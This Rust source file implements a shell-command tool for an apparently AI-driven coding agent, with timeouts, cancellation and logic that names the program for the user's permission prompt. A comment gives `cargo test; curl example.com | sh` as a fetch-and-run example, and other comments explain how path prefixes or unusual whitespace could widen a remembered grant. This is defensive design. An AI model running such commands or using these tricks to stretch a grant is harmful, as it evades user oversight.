//! Running a shell command.
//!
//! The command runs in the workspace root through `sh -c`, so the model gets
//! pipes and redirection without this file growing a shell of its own. Nothing
//! here confines what runs: a shell can reach anything the user can, which is
//! why every call comes through the permission engine and why the question the
//! user is asked names the program.

mod output;

use std::process::{Command, Stdio};
use std::time::Duration;

use crucible_core::{Cancel, Grant, Sensitivity, Tool, ToolArgs, ToolError, ToolOutput, Workspace};

use crate::args::Args;

/// The name the model calls.
const NAME: &str = "bash";

/// How long a command may take when the call does not say, in seconds.
const SECONDS: usize = 120;

/// The longest a call may ask for, in seconds. A command that needs longer
/// than this wants a different tool, not a bigger number.
const CEILING: usize = 600;

/// How often the command is checked on while it runs. Short enough that a
/// cancelled turn stops promptly, long enough to cost nothing.
const TICK: Duration = Duration::from_millis(20);

/// The root `description` is the tool's own; everything below it describes the
/// arguments.
const SCHEMA: &str = r#"{
  "description": "Runs a shell command in the workspace root and returns its output and exit status.",
  "type": "object",
  "properties": {
    "command": {
      "type": "string",
      "description": "The command line to run, as a shell would read it."
    },
    "timeout": {
      "type": "integer",
      "minimum": 1,
      "description": "How many seconds to allow before stopping it. Defaults to 120, and cannot exceed 600."
    }
  },
  "required": ["command"]
}"#;

/// Runs shell commands in the workspace root.
#[derive(Debug)]
pub struct Bash {
    workspace: Workspace,
    cancel: Cancel,
    /// Laid over what crucible itself was started with — see [`Bash::exporting`].
    env: Vec<(Box<str>, Box<str>)>,
}

impl Bash {
    /// Runs in `workspace`, and stops when `cancel` says to.
    #[must_use]
    pub fn new(workspace: Workspace, cancel: Cancel) -> Self {
        Self {
            workspace,
            cancel,
            env: Vec::new(),
        }
    }

    /// Variables every command this tool runs is started with.
    ///
    /// Handed to each child rather than set in this process, which is not a
    /// workaround: writing to the environment is `unsafe` in edition 2024 and
    /// this workspace forbids it, and the narrower thing is the right thing
    /// anyway. The model's commands get these; nothing else does, and a thread
    /// reading the environment while another one writes it cannot happen.
    ///
    /// A name given here wins over the one crucible inherited, because somebody
    /// who wrote `PATH` into a configuration file meant it for the commands
    /// crucible runs.
    #[must_use]
    pub fn exporting<'a>(mut self, vars: impl IntoIterator<Item = (&'a str, &'a str)>) -> Self {
        self.env = vars
            .into_iter()
            .map(|(name, value)| (name.into(), value.into()))
            .collect();
        self
    }
}

impl Tool for Bash {
    fn name(&self) -> &'static str {
        NAME
    }

    fn schema(&self) -> &'static str {
        SCHEMA
    }

    fn sensitivity(&self, args: &ToolArgs) -> Sensitivity {
        let named = match Args::parse(NAME, args)
            .and_then(|args| args.text("command").map(str::to_owned))
        {
            Ok(command) => program(&command).to_owned(),
            // A call this malformed will be refused by `run`, but it still has
            // to be given a sensitivity first — and the safe answer to "what is
            // about to run" when the answer cannot be read is everything that
            // was sent, not the first word of it.
            Err(_) => args.as_str().to_owned(),
        };

        Sensitivity::SpawnsProcess {
            program: named.into(),
        }
    }

    fn run(&self, args: ToolArgs, _grant: Grant) -> Result<ToolOutput, ToolError> {
        let args = Args::parse(NAME, &args)?;
        let command = args.text("command")?;
        let seconds = args.count("timeout", SECONDS)?;

        if seconds > CEILING {
            return Ok(ToolOutput::failed(format!(
                "timeout must be {CEILING} seconds or less"
            )));
        }

        if self.cancel.requested() {
            return Err(ToolError::Cancelled(NAME));
        }

        let child = Command::new("sh")
            .arg("-c")
            .arg(command)
            .current_dir(self.workspace.root())
            .envs(
                self.env
                    .iter()
                    .map(|(name, value)| (name.as_ref(), value.as_ref())),
            )
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .map_err(|source| io("could not start a shell", source))?;

        // `count` already refused anything but a positive number, and the
        // ceiling above bounds it, so the fallback is unreachable arithmetic
        // rather than a decision.
        let allowed = Duration::from_secs(u64::try_from(seconds).unwrap_or(60));

        output::collect(child, allowed, &self.cancel)
    }
}

/// What is about to run, for the question the user is asked and for what a
/// session-wide allow remembers.
///
/// A command that chains, pipes or redirects is reported whole. Its first word
/// does not describe what it does, and remembering `cargo` from `cargo test`
/// would then also allow `cargo test; curl example.com | sh`.
///
/// The word is reported as the model wrote it, path and all. `cargo` and
/// `./cargo` are different programs, and a remembered grant that could not tell
/// them apart would run any file of that name the model had just written.
fn program(command: &str) -> &str {
    // The shell's separators, which are not Rust's: `char::is_whitespace`
    // follows Unicode and would treat a no-break space as one of these.
    const IFS: [char; 3] = [' ', '\t', '\n'];

    let command = command.trim_matches(IFS);

    if command.contains([';', '|', '&', '`', '\n', '(', '>', '<']) {
        return command;
    }

    // Any other whitespace stays inside the word as far as `sh` is concerned,
    // so the text before it is a prefix of what runs rather than the name of
    // it. `./build\u{a0}x` would otherwise be announced — and remembered by an
    // `always` — as `./build`, while a second binary is what executes.
    if command.contains(|c: char| c.is_whitespace() && !IFS.contains(&c)) {
        return command;
    }

    match command.split(IFS).find(|word| !word.is_empty()) {
        // A leading `VAR=value` decides which binary the word after it
        // resolves to, so that word on its own no longer says what will run.
        Some(word) if !word.contains('=') => word,
        _ => command,
    }
}

/// An operating-system failure, named for the model.
fn io(problem: &'static str, source: std::io::Error) -> ToolError {
    ToolError::Io {
        tool: NAME,
        problem: problem.into(),
        source,
    }
}

#[cfg(test)]
mod tests;
